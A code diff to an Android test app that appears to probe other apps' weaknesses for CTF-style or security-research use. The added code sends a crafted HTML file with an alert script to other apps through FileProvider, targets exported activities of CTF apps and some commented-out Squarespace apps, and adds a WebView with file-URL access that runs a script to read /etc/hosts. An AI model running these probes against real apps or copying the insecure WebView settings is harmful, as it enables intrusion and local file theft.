@@ -9,13 +9,17 @@ import android.content.ServiceConnection;
 import android.content.SharedPreferences;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteOpenHelper;
+import android.net.Uri;
 import android.os.Environment;
 import android.os.IBinder;
+import android.support.v4.content.FileProvider;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.text.TextUtils;
 import android.util.Log;
 import android.view.View;
+import android.webkit.WebSettings;
+import android.webkit.WebView;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
@@ -28,6 +32,7 @@ import org.json.JSONObject;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.net.URI;
 
 import okhttp3.CertificatePinner;
 import okhttp3.OkHttpClient;
@@ -45,6 +50,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     public static final String MYPREF = "mypref";
     public static final String MSG_PAYLOAD = "MSGPAYLOAD";
     private static final String EXTERNAL_FILE_NAME = "ext_file.txt";
+    public static final String MAL_FILE = "malfiles";
+    private static final String SHARED_PROVIDER_AUTHORITY = "com.ha0k3.helloworld.FileProvider";
+
     private Button startService;
     private Button stopService;
     private Button bindService;
@@ -110,8 +118,60 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         br = new MyReceiver();
         IntentFilter filter = new IntentFilter("com.flagstore.ctf.OUTGOING_INTENT");
         registerReceiver(br,filter);
+        //        Intent intent = new Intent().setClassName("com.demo.filereceiver", "com.demo.filereceiver.MainActivity");
+//        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
 
     }
+
+    public void share(View view) throws IOException {
+        // Create a random image and save it in private app folder
+        final File malfiles = new File(getFilesDir(), MAL_FILE);
+        malfiles.mkdirs();
+        final File sharedFile = File.createTempFile("test", ".html", malfiles);
+        sharedFile.createNewFile();
+        Log.d("Message_TAG", "createfile success");
+        final Uri uri = FileProvider.getUriForFile(this, SHARED_PROVIDER_AUTHORITY, sharedFile);
+
+        FileOutputStream fileOutputStream = null;
+        try {
+            fileOutputStream = new FileOutputStream(sharedFile);
+            fileOutputStream.write("<script>alert(1)</script>".getBytes());
+        } catch (IOException e) {
+            e.printStackTrace();
+            Toast.makeText(this, "Exception: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+        } finally {
+            try {
+                fileOutputStream.close();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+
+        Log.d("Message_TAG: uri = ", uri.toString());
+
+        Intent intent = new Intent();
+//        ComponentName cn=new ComponentName("com.squarespace.android.note.ui.activity","com.squarespace.android.note.ui.activity.StartActivity");
+        //        ComponentName cn = new ComponentName("com.squarespace.android.zendesk", "com.squarespace.android.zendesk/.ZendeskActivity");
+//        intent.setClassName("com.squarespace.android.note","ui.activity.StartActivity");
+        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
+        intent.setAction("android.intent.action.SEND");
+        intent.setType("image/*");
+//        intent.setType("text/plain");
+//        intent.putExtra(Intent.EXTRA_TEXT,"Hey!");
+        intent.putExtra(Intent.EXTRA_STREAM,uri);
+        startActivity(intent);
+
+
+//        Intent sendIntent = new Intent();
+//        sendIntent.setAction(Intent.ACTION_SEND);
+//        sendIntent.putExtra(Intent.EXTRA_TEXT, "This is my text to send.");
+//        sendIntent.setType("text/plain");
+//        startActivity(sendIntent);
+
+        Toast.makeText(this, "Malfile created", Toast.LENGTH_SHORT).show();
+    }
+
 
     private File getFile(){
         return new File(Environment.getExternalStorageDirectory(),EXTERNAL_FILE_NAME);
@@ -139,8 +199,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         Toast.makeText(MainActivity.this, "Trying to start export activity!",
                 Toast.LENGTH_LONG).show();
         Intent intent = new Intent();
-        ComponentName cn=new ComponentName("com.nccgroup.johnnyfive",
-                "com.nccgroup.johnnyfive.AdminActivity");
+        ComponentName cn=new ComponentName("com.nccgroup.johnnyfive", "com.nccgroup.johnnyfive.AdminActivity");
+//        ComponentName cn=new ComponentName("com.squarespace.android.note.ui.activity","com.squarespace.android.note.ui.activity.StartActivity");
+//        ComponentName cn = new ComponentName("com.squarespace.android.zendesk", "com.squarespace.android.zendesk/.ZendeskActivity");
         intent.setComponent(cn);
         startActivity(intent);
     }
@@ -177,8 +238,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
         File file = new File(INTERNAL_FILE);
         File extfile = getFile();
-
-        Log.i("Message_TAG", "exfile path: " + extfile.getAbsolutePath());
+        Uri file_uri = Uri.fromFile(file);
+        Log.i("Message_TAG", "intfile uri: " + file_uri.toString());
+        Log.i("Message_TAG", "intfile path: " + file.getAbsolutePath());
         // write to internal file
         try {
             fileOutputStream = openFileOutput(INTERNAL_FILE, MODE_PRIVATE);
@@ -300,5 +362,41 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         Intent intent = new Intent();
         intent.setAction("jakhar.aseem.diva.action.VIEW_CREDS");
         startActivity(intent);
+    }
+
+    public void showWebView(View view) {
+        WebView webview = new WebView(this);
+        setContentView(webview);
+        WebSettings webSettings = webview.getSettings();
+        webSettings.setJavaScriptEnabled(true);
+//        webSettings.setAllowFileAccess(true);
+        webSettings.setAllowFileAccessFromFileURLs(true);     // this makes ajax to local file possible
+        webSettings.setAllowContentAccess(true);
+
+
+
+        String data = "<html><body>You scored <b>1337</b> points.<script>document.write(1)" +
+                "</script>\n" +
+                "<script>\n" +
+                "document.write(2);\n" +
+                "var httpRequest;\n" +
+                "makeRequest();\n" +
+                "function makeRequest() {\n" +
+                "  httpRequest = new XMLHttpRequest();\n" +
+                "  httpRequest.onreadystatechange = alertContents;\n" +
+                "  httpRequest.open(\"GET\", \"file:///etc/hosts\");\n" +
+                "  httpRequest.send();\n" +
+                "}\n" +
+                "function alertContents() {\n" +
+                "  if (httpRequest.readyState === XMLHttpRequest.DONE){\n" +
+                "    document.write(httpRequest.responseText)\n" +
+                "  }\n" +
+                "}\n" +
+                "</script>";
+//        String data = "<html><body>You scored <b>1337</b> points.<button onclick='" + script + ")'>clickme</script></body></html>";
+//        String data = "<html><body>You scored <b>1337</b> points.<script>document.write(1)</script>" + script + "</body></html>";
+        Log.d(TAG,data);
+        webview.loadDataWithBaseURL("file:///bla/bla/bla", data, "text/HTML", "UTF-8", null);
+//        webview.loadUrl("file:///etc/hosts");
     }
 }
